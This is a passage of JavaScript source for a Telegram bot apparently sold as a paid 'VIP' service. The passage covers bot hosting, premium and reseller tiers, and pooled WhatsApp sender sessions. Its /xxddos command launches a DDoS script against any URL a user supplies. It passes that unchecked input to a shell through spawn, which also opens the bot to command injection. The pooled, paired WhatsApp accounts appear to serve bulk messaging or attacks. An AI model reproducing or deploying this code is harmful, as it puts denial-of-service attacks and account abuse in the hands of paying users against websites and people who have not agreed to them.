        'CAACAgUAAxkBAAEhJBdqbV5tQEackJRmNQnQys2TP8fljwACkRYAAvDBAVYExm1e84EYcz0E'
    );

                setTimeout(async () => {
            await S7.deleteMessage(chatId, sticker.message_id).catch(() => {});

            const captionText = `<b>✨ S H A H Z U -  V I P B O T</b>

<b>✨ Developer :</b> ${botConfig.ownerContact} 🤍
<b>✨ System :</b> ${status} ☠
<b>✨ Platform :</b> Telegram 📱
<b>✨ Online :</b> ${uptime} ✨

<b>👑 Click The Buttons Bellow</b>`;

            S7.sendPhoto(chatId, botConfig.logo, {
                caption: captionText,
                parse_mode: 'HTML',
                ...SABIR7718
            }).catch(() => {
                S7.sendMessage(chatId, captionText, {
                    parse_mode: 'HTML',
                    ...SABIR7718
                });
            });
        }, 1000);
    });
  
        SYLoVe('setbot', async (msg) => {
            const chatId = msg.chat.id.toString();
            if (tokenData && tokenData.owner !== chatId) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> You are not the owner of this bot.', {
            parse_mode: 'HTML'            
            });
            }

            const messageText = msg.text || msg.caption || '';
            const args = messageText.split(' ');
            const type = args[1] && args[1].toLowerCase();
            let value = args.slice(2).join(' ');

            if (type === 'logo' && msg.photo) {
                value = msg.photo[msg.photo.length - 1].file_id;
            } else if (type === 'logo' && msg.reply_to_message && msg.reply_to_message.photo) {
                value = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
            }

            if (!type || !value) {
                return S7.sendMessage(chatId,
                    '⚙️ *Bot Customization*\n\n' +
                    '*Branding:*\n' +
                    '/setbot name <Name>\n' +
                    '/setbot logo <Upload a Link or Photo With a Caption>\n' +
                    '/setbot channel <Link>\n' +
                    '/setbot group <Link>\n' +
                    '/setbot contact <@User>\n\n' +
                    '*Protection (Force Sub):*\n' +
                    '/setbot protection on/off\n' +
                    '/setbot channelid <ID> (e.g -100xxxx)\n' +
                    '/setbot groupid <ID> (e.g -100xxxx)', {
                        parse_mode: 'Markdown'
                    }
                );
            }

            db = getDB();
            let tIndex = db.tokens.findIndex(t => t.token === token);

            if (tIndex === -1) {
                return S7.sendMessage(chatId,
                    '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> <b>Error:</b> This bot is not found in the database.\n' +
                    'If this is the Main Bot, please edit <code>config.js</code> manually instead of using this command.', {
                        parse_mode: 'HTML'
                    }
                );
            }

            if (!db.tokens[tIndex].config) db.tokens[tIndex].config = {};

            if (type === 'channel') db.tokens[tIndex].config.channel = value;
            else if (type === 'group') db.tokens[tIndex].config.group = value;
            else if (type === 'logo') db.tokens[tIndex].config.logo = value;
            else if (type === 'name') db.tokens[tIndex].config.botName = value;
            else if (type === 'contact') db.tokens[tIndex].config.ownerContact = value;
            else if (type === 'protection') {
                db.tokens[tIndex].config.protectionState = (value.toLowerCase() === 'on');
            } else if (type === 'channelid') db.tokens[tIndex].config.channelId = value;
            else if (type === 'groupid') db.tokens[tIndex].config.groupId = value;
            else return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid type. Check the menu for options.', {
            parse_mode: 'HTML'            
            });

            saveDB(db);

            await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> <b>${type}</b> updated! Restarting bot to apply changes...`, {
                parse_mode: 'HTML'
            });

            if (activeBots[token]) {
                try {
                    await activeBots[token].stopPolling();
                } catch (e) {
                    console.log('Error stopping polling during restart:', e.message);
                }
            }
            startSYloveBot(token);
        });




        SYLoVe('delbot', async (msg) => {
            const chatId = msg.chat.id.toString();
            let db = getDB();

            const botData = db.tokens.find(t => t.owner === chatId);

            if (!botData) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> You do not have a hosted bot.', {
            parse_mode: 'HTML'            
            });
            }

            if (activeBots[botData.token]) {
                await activeBots[botData.token].stopPolling();
                delete activeBots[botData.token];
            }

            db.tokens = db.tokens.filter(t => t.owner !== chatId);
            saveDB(db);

            const userAuthPath = `./Love/${chatId}`;
            if (fs.existsSync(userAuthPath)) {
                fs.rmSync(userAuthPath, {
                    recursive: true,
                    force: true
                });
            }

            S7.sendMessage(chatId, '<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Your bot has been deleted and sessions removed.', {
            parse_mode: 'HTML'            
            });
        });


        SYLoVe('addbot', async (msg) => {
            const chatId = msg.chat.id.toString();
            const args = msg.text.split(' ');
            const newToken = args[1];

            if (!newToken) return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Usage: /addbot <TOKEN>', {
            parse_mode: 'HTML'            
            });

            let db = getDB();
            const userBots = db.tokens.filter(t => t.owner === chatId);
            if (userBots.length >= 1) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> You can only host 1 bot.', {
            parse_mode: 'HTML'            
            });
            }

            try {
                const tempBot = new SY(newToken, {
                    polling: false
                });
                const botInfo = await tempBot.getMe();
                db.tokens.push({
                    token: newToken,
                    owner: chatId,
                    config: {
                        channel: config.channel,
                        group: config.group,
                        logo: config.logo,
                        botName: botInfo.first_name
                    }
                });
                saveDB(db);
                startSYloveBot(newToken);

                S7.sendMessage(chatId,
                    `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> <b>Bot Hosted Successfully!</b>\n\n` +
                    `🤖 Name: ${botInfo.first_name}\n` +
                    `user: @${botInfo.username}\n\n` +
                    `⚠️ <b>Next Steps:</b>\n` +
                    `1. Make your bot <b>ADMIN</b> in your Channel & Group.\n` +
                    `2. Use <code>/setbot</code> to customize your links and image.`, {
                        parse_mode: 'HTML'
                    }
                );

            } catch (e) {
                S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid Token or Bot already active.', {
            parse_mode: 'HTML'            
            });
            }
        });
        
SYLoVe('groupid', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();

    let db = getDB();

    // Free users allowed - no premium restriction for groupid

    // 1. Parsing args di paling atas
    const args = msg.text.trim().split(/\s+/);
    const groupLink = args[1];

    if (!groupLink) {
        return S7.sendMessage(
            chatId,
            'Usage: /groupid GROUP_LINK\n\n' +
            'Example:\n' +
            '/groupid https://chat.whatsapp.com/xxxxxxxxxxxx'
        );
    }

    if (!groupLink.includes('chat.whatsapp.com/')) {
        return S7.sendMessage(
            chatId,
            '❌ Invalid WhatsApp group link.'
        );
    }

    // 2. Check WhatsApp sessions - free users can also use global senders for groupid
    let sessions = getAvailableSenders(chatId, userId);
    if (!sessions || sessions.length === 0) sessions = getGlobalSenders();
    if (!sessions || sessions.length === 0) {
        return S7.sendMessage(chatId, '❌ No active WhatsApp session.\nPlease pair with /reqpair or ask a member to pair for Global Sender.', { parse_mode: 'HTML' });
    }

    const randomSession = sessions[Math.floor(Math.random() * sessions.length)];
    const client = randomSession.sock;

    try {
        const inviteCode = groupLink
            .split('chat.whatsapp.com/')[1]
            .split(/[?\s]/)[0];

        if (!inviteCode) {
            return S7.sendMessage(
                chatId,
                '❌ Invalid WhatsApp group link.'
            );
        }

        const groupInfo = await client.groupGetInviteInfo(inviteCode);

        if (!groupInfo || !groupInfo.id) {
            return S7.sendMessage(
                chatId,
                '❌ Failed to get the WhatsApp group ID.'
            );
        }

        return S7.sendMessage(
            chatId,
            `╭───「 GROUP ID 」\n` +
            `│\n` +
            `│ 🆔 ID: <code>${groupInfo.id}</code>\n` +
            `│\n` +
            `╰────────────`,
            { parse_mode: 'HTML' }
        );

    } catch (error) {
        console.error('Group ID Error:', error);

        return S7.sendMessage(
            chatId,
            '❌ Failed to retrieve the group ID.\n' +
            'Make sure the invite link is valid and accessible.'
        );
    }
});

        SYLoVe('xxddos', (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ').slice(1);
            if (args.length < 2) {
                return S7.sendMessage(
                    chatId,
                    '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Usage:\n/xxddos <web> <time>\n\nExample:\n/ddos https://example.com 60', {
            parse_mode: 'HTML'            
            });
            }
            const target = args[0];
            const time = args[1];
            S7.sendMessage(
                chatId,
                `⚡ <b>Attacking Target</b>\n\n` +
                `🎯 Target: <code>${target}</code>\n` +
                `⏱ Time: <code>${time}</code> seconds\n\n` +
                `⚙️ Process started...`, {
                    parse_mode: 'HTML'
                }
            );
            spawn(
                `node ./SY/ddos.js ${target} ${time}`, {
                    shell: true,
                    stdio: 'inherit'
                }
            );

        });


        SYLoVe('checkmembership', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;

            const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);

            if (isMember) {
                S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> <b>Membership verified!</b>\nYou are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`, {
                    parse_mode: 'HTML'
                });
            } else {
                S7.sendMessage(chatId, protectionMessage, {
                    parse_mode: 'HTML',
                    ...SYLovesButton
                });
            }
        });


        SYLoVe('addtoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (userId !== config.adminId && chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            const args = msg.text.split(' ');
            const newToken = args[1];
            if (!LoveGlobalState(userId, chatId)) {
                return sendSYLove(S7, chatId);
            }
            if (!newToken) return S7.sendMessage(chatId, 'Usage: /addtoken <token>');
            let db = getDB();
            if (db.tokens.find(t => t.token === newToken)) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Token already connected.', {
            parse_mode: 'HTML'            
            });
            }
            const myBotsCount = db.tokens.filter(t => t.owner === userId).length;
            if (myBotsCount >= 5) {
                return S7.sendMessage(
                    chatId,
                    '🚫 Bot limit reached!\n\nYou can only add <b>5 bots maximum</b>.', {
                        parse_mode: 'HTML'
                    }
                );
            }
            try {
                const tempBot = new SY(newToken, {
                    polling: false
                });
                const botInfo = await tempBot.getMe();
                db.tokens.push({
                    token: newToken,
                    owner: userId
                });
                saveDB(db);
                startSYloveBot(newToken);
                S7.sendMessage(chatId,
                    `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Token Connected\nBot: ${botInfo.first_name}\n@${botInfo.username}`, { 
                     parse_mode: 'HTML' 
                });
            } catch (e) {
                S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid token.', {
            parse_mode: 'HTML'            
            });
            }
        });
        SYLoVe('reqpair', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId, chatId)) {
                return sendSYLove(S7, chatId);
            }

            if (!number) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /reqpair +919876543210', {
            parse_mode: 'HTML'            
            });
            }

            const cleanNumber = number.replace(/[^0-9]/g, '');
            let db = getDB();
            let currentBotTokenObj = db.tokens.find(t => activeBots[t.token] === S7);
            let ownerID = null;
            if (currentBotTokenObj) {
                ownerID = currentBotTokenObj.owner;
            }
            await StartLovingSY(chatId, cleanNumber, S7, false, ownerID);
        });

        SYLoVe('delpair', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];

            if (!LoveGlobalState(userId, chatId)) {
                return sendSYLove(S7, chatId);
            }

            if (!number) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /delpair +919876543210', {
            parse_mode: 'HTML'
            });
            }

            const cleanNumber = number.replace(/[^0-9]/g, '');
            // check both possible paths
            const paths = [
                `./Love/auth/${chatId}/${cleanNumber}`,
                `./Love/${chatId}/Auths/${cleanNumber}`
            ];
            // also search global for that number if user is owner/admin/svip trying to delete any
            let found=false;
            for(const p of paths){
                if (fs.existsSync(p)) {
                    try { fs.rmSync(p, { recursive: true, force: true }); found=true; } catch(err){ return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Failed: ${err.message}`, {parse_mode:'HTML'}); }
                }
            }
            // also remove from waSessions memory
            if(waSessions[chatId]) waSessions[chatId]=waSessions[chatId].filter(s=>s.num!==cleanNumber);
            // if SVIP/admin, also search global sessions
            if(!found && (getUserTier(userId)>=3 || isGroupSvip(chatId))){
                for(const oc of Object.keys(waSessions)){
                    const idx=waSessions[oc].findIndex(s=>s.num===cleanNumber);
                    if(idx!==-1){
                        waSessions[oc].splice(idx,1);
                        const gp=`./Love/auth/${oc}/${cleanNumber}`;
                        const gp2=`./Love/${oc}/Auths/${cleanNumber}`;
                        try{ if(fs.existsSync(gp)) fs.rmSync(gp,{recursive:true,force:true}); if(fs.existsSync(gp2)) fs.rmSync(gp2,{recursive:true,force:true}); }catch{}
                        found=true; break;
                    }
                }
            }
            if(found) S7.sendMessage(chatId, `🗑️ Session deleted for <b>${cleanNumber}</b>.`, {parse_mode:'HTML'});
            else S7.sendMessage(chatId, `⚠️ No session found for <b>${cleanNumber}</b>.`, {parse_mode:'HTML'});
        });
         SYLoVe(['delsender','delallsender'], (msg)=>{
            const chatId=msg.chat.id.toString();
            const userId=msg.from.id.toString();
            if (userId !== config.adminId && chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            if(!LoveGlobalState(userId,chatId)) return sendSYLove(S7,chatId);
            const args=msg.text.trim().split(/\s+/);
            if(args[1]==='all'){
                // owner only
                if(userId!==config.adminId && chatId!==config.adminId) return S7.sendMessage(chatId, notauthorized);
                let count=0;
                for(const oc of Object.keys(waSessions)){ count+=waSessions[oc].length; waSessions[oc]=[]; }
                // delete filesystem?
                try{ if(fs.existsSync('./Love/auth')) fs.rmSync('./Love/auth',{recursive:true,force:true}); fs.mkdirSync('./Love/auth',{recursive:true}); }catch{}
                return S7.sendMessage(chatId, `🗑️ All senders cleared (${count} sessions).`, {parse_mode:'HTML'});
            }
            return S7.sendMessage(chatId, 'Usage: /delsender all — delete all senders (admin only) or /delpair <number>');
        });


        SYLoVe('deltoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (userId !== config.adminId && chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            const args = msg.text.split(' ');
            const delToken = args[1];
            if (!LoveGlobalState(userId, chatId)) {
                return sendSYLove(S7, chatId);
            }

            if (!delToken) return S7.sendMessage(chatId, 'Usage: /deltoken <token>');

            let db = getDB();
            const tokenObj = db.tokens.find(t => t.token === delToken);

            if (!tokenObj || tokenObj.owner !== userId) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No connected token found.', {
            parse_mode: 'HTML'            
            });
            }

            db.tokens = db.tokens.filter(t => t.token !== delToken);
            saveDB(db);

            if (activeBots[delToken]) {
                await activeBots[delToken].stopPolling();
                delete activeBots[delToken];
            }
            log('info', `Token deleted: ${delToken.substring(0, 10)}...`);
            S7.sendMessage(chatId, '<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Token deleted successfully.', {
            parse_mode: 'HTML'            
            }); 
        });

        SYLoVe('mytoken', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();

            let db = getDB();
            const myTokens = db.tokens.filter(t => t.owner === userId);
            if (!LoveGlobalState(userId, chatId)) {
                return sendSYLove(S7, chatId);
            }

            if (myTokens.length === 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> You have not added any tokens.', {
            parse_mode: 'HTML'            
            });
            }

            let text = '<b>Your Connected Bots</b>\n';
            text += '────────────────────\n\n';

            let count = 1;

            for (const item of myTokens) {
                try {
                    const bot = new SY(item.token, {
                        polling: false
                    });
                    const info = await bot.getMe();

                    text += `<b>${count}. ${info.first_name}</b>\n`;
                    text += `👤 Username: <b>@${info.username}</b>\n`;
                    text += `🔑 Token:\n<code>${item.token}</code>\n`;
                    text += '────────────────────\n\n';

                    count++;
                } catch (err) {
                    text += `<b>${count}. ⚠️ Unknown Bot</b>\n`;
                    text += `🔑 Token:\n<code>${item.token}</code>\n`;
                    text += '────────────────────\n\n';
                    count++;
                }
            }

            S7.sendMessage(chatId, text, {
                parse_mode: 'HTML'
            });
        });

        SYLoVe('addresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId, chatId)) {
                return sendSYLove(S7, chatId);
            }
            if (chatId !== config.adminId && userId !== config.adminId) return S7.sendMessage(chatId, notauthorized);

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addresell ID');

            let db = getDB();
            if (db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is already a Reseller.');

            db.resellers.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> ID ${targetId} added as Reseller.`, {
            parse_mode: 'HTML'            
            });
        });

        SYLoVe('delresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId, chatId)) {
                return sendSYLove(S7, chatId);
            }
            if (chatId !== config.adminId && userId !== config.adminId) return S7.sendMessage(chatId, notauthorized);

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delresell ID');

            let db = getDB();
            if (!db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is not a Reseller.');

            db.resellers = db.resellers.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> ID ${targetId} removed from Resellers.`, {
            parse_mode: 'HTML'            
            });
        });

        SYLoVe('listresell', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    if (!LoveGlobalState(userId, chatId)) {
        return sendSYLove(S7, chatId);
        }
    if (chatId !== config.adminId) {
        return S7.sendMessage(chatId, notauthorized);
    }

    let db = getDB();
    if (db.resellers.length === 0) {
        return S7.sendMessage(chatId, 'No resellers found.');
    }

    let text = 'Reseller List:\n\n';

    for (let i = 0; i < db.resellers.length; i++) {
        const id = db.resellers[i].toString();
        try {
            const user = await S7.getChat(id);
            const username = user.username ? `@${user.username} : ` : '';
            text += `${i + 1}. ${username}<code>${id}</code>\n`;
        } catch (e) {
            text += `${i + 1}. \`${id}\`\n`;
        }
    }
    text += '\n──────────────────';

    S7.sendMessage(chatId, text, {
        parse_mode: 'HTML'
    });
});

        SYLoVe('addprem', (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    let db = getDB();
    const isOwner = userId === config.adminId || chatId === config.adminId;
    const isReseller = db.resellers.includes(userId) || db.resellers.includes(chatId);
    if (!isOwner && !isReseller) return S7.sendMessage(chatId, notauthorized);
    if (!LoveGlobalState(userId, chatId)) {
        return sendSYLove(S7, chatId);
    }

    const args = msg.text.trim().split(/\s+/);
    const targetId = args[1];
    const duration = args[2];

    if (!targetId || !duration) {
        return S7.sendMessage(
            chatId,
            'Usage: /addprem ID days\n\nExample:\n/addprem 12345678 30d'
        );
    }

    // Duration format: 30d, 7d, 1d, etc.
    const match = duration.match(/^(\d+)d$/i);

    if (!match) {
        return S7.sendMessage(
            chatId,
            'Invalid duration format.\nPlease use a format like: 30d, 7d, or 1d.'
        );
    }

    const days = parseInt(match[1]);

    if (days <= 0) {
        return S7.sendMessage(
            chatId,
            'The number of days must be greater than 0.'
        );
    }

    if (!db.premiumExpiry) {
        db.premiumExpiry = {};
    }

    if (db.premium.includes(targetId)) {
        return S7.sendMessage(
            chatId,
            'This user is already Premium.'
        );
    }

    const expiredAt = Date.now() + (days * 24 * 60 * 60 * 1000);

    db.premium.push(targetId);
    db.premiumExpiry[targetId] = expiredAt;

    saveDB(db);

    const expiredDate = new Date(expiredAt).toLocaleString('en-US', {
        timeZone: 'Asia/Jakarta',
        dateStyle: 'long',
        timeStyle: 'short'
    });

    S7.sendMessage(
        chatId,
        `⭐ ID ${targetId} has been successfully added to Premium.\n\n` +
        `⏳ Duration: ${days} days\n` +
        `📅 Expired: ${expiredDate}`
    );
});

        SYLoVe('delprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            const isOwner = userId === config.adminId || chatId === config.adminId;
            const isReseller = db.resellers.includes(userId) || db.resellers.includes(chatId);
            if (!isOwner && !isReseller) return S7.sendMessage(chatId, notauthorized);
            if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delprem ID');
            if (!db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is not Premium.');
            db.premium = db.premium.filter(id => id !== targetId);
            if(db.premiumExpiry) delete db.premiumExpiry[targetId];
            saveDB(db);
            S7.sendMessage(chatId, `🗑️ ID ${targetId} removed from Premium.`);
      });
// ===== SVIP SYSTEM =====
        SYLoVe('addsvip', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (userId !== config.adminId && chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            let db = getDB();
            if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
            const args = msg.text.trim().split(/\s+/);
            const targetId = args[1];
            const duration = args[2] || '30d';
            const match = duration.match(/^(\d+)d$/i);
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addsvip ID [days]\nExample: /addsvip 12345678 30d');
            if (!match) return S7.sendMessage(chatId, 'Invalid duration. Use 30d format.');
            const days = parseInt(match[1]);
            if (!db.svip) db.svip=[];
            if (!db.svipExpiry) db.svipExpiry={};
            if (db.svip.includes(targetId)) return S7.sendMessage(chatId, 'User already SVIP.');
            const expiredAt = Date.now() + (days * 24 * 60 * 60 * 1000);
            db.svip.push(targetId);
            db.svipExpiry[targetId]=expiredAt;
            // SVIP automatically gets premium if not already
            if (!db.premium.includes(targetId)) { db.premium.push(targetId); if(!db.premiumExpiry) db.premiumExpiry={}; db.premiumExpiry[targetId]=expiredAt; }
            saveDB(db);
            const expiredDate = new Date(expiredAt).toLocaleString('en-US', { timeZone: 'Asia/Jakarta', dateStyle:'long', timeStyle:'short'});
            S7.sendMessage(chatId, `💎 <b>SVIP Added</b>\n\nID: <code>${targetId}</code>\nDuration: ${days} days\nExpired: ${expiredDate}\n\n✨ SVIP can use <b>Global Senders</b> without pairing!`, {parse_mode:'HTML'});
        });
        SYLoVe('delsvip', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (userId !== config.adminId && chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            let db = getDB();
            if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delsvip ID');
            if (!db.svip || !db.svip.includes(targetId)) return S7.sendMessage(chatId, 'User is not SVIP.');
            db.svip = db.svip.filter(id=>id!==targetId);
            if(db.svipExpiry) delete db.svipExpiry[targetId];
            saveDB(db);
            S7.sendMessage(chatId, `🗑️ ID ${targetId} removed from SVIP.`);
        });
        SYLoVe('listsvip', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (userId !== config.adminId && chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
            let db=getDB();
            if (!db.svip || db.svip.length===0) return S7.sendMessage(chatId, 'No SVIP users found.');
            let text=`💎 <b>SVIP List (${db.svip.length})</b>\n\n`;
            for(let i=0;i<db.svip.length;i++){
                const id=db.svip[i].toString();
                const exp=db.svipExpiry[id]? new Date(db.svipExpiry[id]).toLocaleDateString('en-GB',{timeZone:'Asia/Jakarta'}):'Permanent';
                try{ const u=await S7.getChat(id); const un=u.username?`@${u.username} : `:''; text+=`${i+1}. ${un}<code>${id}</code> — ⏳ ${exp}\n`; }catch{ text+=`${i+1}. <code>${id}</code> — ⏳ ${exp}\n`; }
            }
            text+='\n──────────────────';
            S7.sendMessage(chatId, text, {parse_mode:'HTML'});
        });
        SYLoVe(['listsender','listsenders','senderlist'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
            const allGlobal = getGlobalSenders();
            const own = waSessions[chatId] || [];
            const avail = getAvailableSenders(chatId, userId);
            const tier = getUserTier(userId);
            const isGlobal = canUseGlobal(userId) || isGroupPremium(chatId) || isGroupSvip(chatId);
            const totalInfo = countAllSenders();
            let text = `<blockquote><b>📱 Sender Status</b></blockquote>`;
            text += `<blockquote>`;
            text += `<b>👤 Tier:</b> ${GetSYLoVe(userId)} (${getTierName(tier)})\n`;
            text += `<b>🔐 Global:</b> ${isGlobal?'YES ✅':'NO ❌'}\n`;
            text += `━━━━━━━━━━━━━━\n`;
            text += `<b>📊 Counts</b>\n`;
            text += `• Own: <b>${own.length}</b>\n`;
            text += `• Global Pool: <b>${allGlobal.length}</b>\n`;
            text += `• Available: <b>${avail.length}</b>\n`;
            text += `• Total Paired: <b>${totalInfo.total}</b>`;
            text += `</blockquote>`;
            if(avail.length===0){
                text += `<blockquote>`;
                text += `❌ <b>No sender available</b>\n`;
                if(tier>=3 || isGlobal) text+= `Global pool empty — ask member to /reqpair.`;
                else text+= `Use /reqpair 62xxxx to pair.\nSVIP = auto global.`;
                text += `</blockquote>`;
            } else {
                text += `<blockquote><b>Available Senders</b>\n`;
                avail.slice(0,15).forEach((s,i)=>{
                    const owner = s.ownerChatId===chatId ? 'You' : s.ownerChatId.substring(0,6)+'…';
                    const st = s.sock ? '🟢' : '🟡';
                    text+= `${i+1}. ${st} <code>${s.num}</code> (${owner})\n`;
                });
                if(avail.length>15) text+= `… +${avail.length-15} more\n`;
                text += `</blockquote>`;
                if(!isGlobal) text+= `<blockquote><i>💡 Tip: SVIP unlocks all Global Senders without pairing!</i></blockquote>`;
            }
            try{
                const offline=[];
                const base='./Love/auth';
                if(fs.existsSync(base)){
                    const chats=fs.readdirSync(base);
                    for(const cId of chats){
                        const cp=path.join(base,cId);
                        if(!fs.statSync(cp).isDirectory()) continue;
                        const nums=fs.readdirSync(cp);
                        for(const n of nums){
                            const p2=path.join(cp,n,'creds.json');
                            if(fs.existsSync(p2)){
                                const online = allGlobal.some(s=>s.num===n);
                                if(!online) offline.push({num:n, owner:cId});
                            }
                        }
                    }
                }
                if(offline.length>0){
                    text+= `<blockquote><b>Offline (${offline.length})</b>\n`;
                    offline.slice(0,8).forEach((o,i)=>{ text+= `${i+1}. <code>${o.num}</code>\n`; });
                    if(offline.length>8) text+= `… +${offline.length-8} more\n`;
                    text+= `</blockquote>`;
                }
            }catch{}
            S7.sendMessage(chatId, text, {parse_mode:'HTML'});
        });
// ===== GROUP PREMIUM / SVIP =====
        SYLoVe(['addgprem','addgroupprem','addpremiumgroup'], (msg)=>{
            const chatId=msg.chat.id.toString();
            const userId=msg.from.id.toString();
            let db=getDB();
            const isOwnerG = userId === config.adminId || chatId === config.adminId;
            const isResellerG = db.resellers.includes(userId) || db.resellers.includes(chatId);
            if (!isOwnerG && !isResellerG) return S7.sendMessage(chatId, notauthorized);
            if(!LoveGlobalState(userId,chatId)) return sendSYLove(S7,chatId);
            const args=msg.text.trim().split(/\s+/);
            const targetGid=args[1];
            const duration=args[2]||'30d';
            if(!targetGid) return S7.sendMessage(chatId, 'Usage: /addgprem <groupId> [duration]\nExample: /addgprem -100123456789 30d\nTip: get ID via /groupid or add bot to group then /id');
            const m=duration.match(/^(\d+)d$/i);
            if(!m) return S7.sendMessage(chatId, 'Invalid duration, use 30d');
            const days=parseInt(m[1]);
            const exp=Date.now()+days*24*60*60*1000;
            if(!db.groupPremium) db.groupPremium={};
            db.groupPremium[targetGid]=exp;
            saveDB(db);
            const expStr=new Date(exp).toLocaleString('en-US',{timeZone:'Asia/Jakarta',dateStyle:'long',timeStyle:'short'});
            S7.sendMessage(chatId, `🏆 <b>Group Premium Added</b>\n\nGroup: <code>${targetGid}</code>\nDuration: ${days} days\nExpired: ${expStr}\n\n✅ Members in that group can now use bot without pairing (Global Senders)!`,{parse_mode:'HTML'});
        });
        SYLoVe(['delgprem','delgroupprem'], (msg)=>{
            const chatId=msg.chat.id.toString();
            const userId=msg.from.id.toString();
            let db=getDB();
            const isOwnerGd = userId === config.adminId || chatId === config.adminId;
            const isResellerGd = db.resellers.includes(userId) || db.resellers.includes(chatId);
            if (!isOwnerGd && !isResellerGd) return S7.sendMessage(chatId, notauthorized);
            if(!LoveGlobalState(userId,chatId)) return sendSYLove(S7,chatId);
            const targetGid=msg.text.split(' ')[1];
            if(!targetGid) return S7.sendMessage(chatId, 'Usage: /delgprem <groupId>');
            if(!db.groupPremium || !db.groupPremium[targetGid]) return S7.sendMessage(chatId, 'Group not premium.');
            delete db.groupPremium[targetGid];
            saveDB(db);
            S7.sendMessage(chatId, `🗑️ Group <code>${targetGid}</code> removed from Premium.`,{parse_mode:'HTML'});
        });
        SYLoVe(['addgsvip','addgroupsvip'], (msg)=>{
            const chatId=msg.chat.id.toString();
            const userId=msg.from.id.toString();
            if (userId !== config.adminId && chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            let db=getDB();
            if(!LoveGlobalState(userId,chatId)) return sendSYLove(S7,chatId);
            const args=msg.text.trim().split(/\s+/);
